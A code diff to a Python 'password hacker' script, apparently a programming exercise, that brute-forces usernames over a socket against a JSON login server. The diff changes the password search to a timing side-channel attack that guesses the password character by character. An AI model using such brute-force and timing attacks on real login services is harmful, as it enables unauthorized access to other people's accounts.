@@ -1,7 +1,7 @@
 import argparse
 import itertools
 import socket
-
+import time
 
 #
 # ██████╗░░█████╗░░██████╗░██████╗░██╗░░░░░░░██╗░█████╗░██████╗░██████╗░      ██╗░░██╗░█████╗░░█████╗░██╗░░██╗███████╗██████╗░
@@ -10,6 +10,9 @@ import socket
 # ██╔═══╝░██╔══██║░╚═══██╗░╚═══██╗░░████╔═████║░██║░░██║██╔══██╗██║░░██║      ██╔══██║██╔══██║██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
 # ██║░░░░░██║░░██║██████╔╝██████╔╝░░╚██╔╝░╚██╔╝░╚█████╔╝██║░░██║██████╔╝      ██║░░██║██║░░██║╚█████╔╝██║░╚██╗███████╗██║░░██║
 # ╚═╝░░░░░╚═╝░░╚═╝╚═════╝░╚═════╝░░░░╚═╝░░░╚═╝░░░╚════╝░╚═╝░░╚═╝╚═════╝░      ╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
+#
+# N33d a f1le w1th u53rnam35 in the w0rk1ng d1r3ct0ry
+# Usage: python hack.py <HOST> <PORT>
 
 
 def get_login():
@@ -45,23 +48,31 @@ response = ""
 with socket.socket() as client_socket:
     client_socket.connect(address)
 
-    while response != '{"result": "Exception happened during login"}':
+    total_time = 0
+    while total_time < 0.09:
         current_login = next(login)
         data = '{"login": "' + current_login + '", "password": ""}'
+        start = time.perf_counter()
         client_socket.send(data.encode())
         response = client_socket.recv(1023).decode()
+        end = time.perf_counter()
+        total_time = end - start
 
     found_pass = " "
     checked_symbol = next(symbol_in_pass)
 
+    total_time = 0
     while response != '{"result": "Connection success!"}':
         data = '{"login": "' + current_login + '", "password": "' + found_pass + '"}'
+        start = time.perf_counter()
         client_socket.send(data.encode())
         response = client_socket.recv(1024).decode()
-        if response == '{"result": "Wrong password!"}':
+        end = time.perf_counter()
+        total_time = end - start
+        if total_time < 0.09:
             checked_symbol = next(symbol_in_pass)
             found_pass = found_pass[:-1] + checked_symbol
-        elif response == '{"result": "Exception happened during login"}':
+        else:
             found_pass += next(symbol_in_pass)
 
     print(data)
